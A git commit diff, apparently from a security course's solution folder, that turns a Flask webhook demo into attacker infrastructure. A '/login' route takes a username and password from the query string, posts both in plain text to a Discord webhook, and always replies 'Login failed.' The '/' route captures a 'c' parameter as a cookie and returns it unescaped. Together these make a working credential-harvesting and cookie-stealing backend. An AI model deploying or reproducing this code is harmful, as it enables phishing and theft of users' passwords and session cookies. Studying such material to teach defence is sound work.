24118236e9c6b4573ce3cfca8defbe249ad1bda0
Kissi <50911745+kfenger@users.noreply.github.com>
2023-12-12 15:31:52 +0100

    endringer med cookies

--- code/solution/Webhooks/app.py
+++ code/solution/Webhooks/app.py
@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request
+from flask import Flask, make_response, request
 import requests
 import json
 
@@ -11,20 +11,34 @@ def send_to_discord(message):
     payload = {"content": message}
     requests.post(discord_webhook_url, json=payload)
 
+
+
 @app.route('/')
-def hello_world():
-    return 'Hello, World!'
+def index():
+   # Get the value of the 'c' parameter from the request (if provided)
+    cookie_value = request.args.get('c', default='')
 
-@app.route('/send_to_discord', methods=['GET'])
-def send_to_discord_route():
-    message = "Jonas Dahl just logged in!"
+    # Set a cookie named 'my_cookie' with the provided value
+    response = make_response('Cookie set!')
+    response.set_cookie('my_cookie', value=str(cookie_value))
+
+
+    return cookie_value
+
+
+
+@app.route('/login', methods=['GET'])
+def login():
+    username = request.args.get('username')
+    password_attempt = request.args.get('password')
+
+    # Send information to Discord regardless of the password
+    message = f"Login attempt for {username}. Password entered: {password_attempt}"
     send_to_discord(message)
-    return f'Message sent to Discord: {message}'
 
+    # In a real-world scenario, you might log the attempt, but don't reveal if the username exists to prevent enumeration attacks.
+    return 'Login failed.'
+
+    
 if __name__ == '__main__':
     app.run(debug=True)
-
-
-
-
-
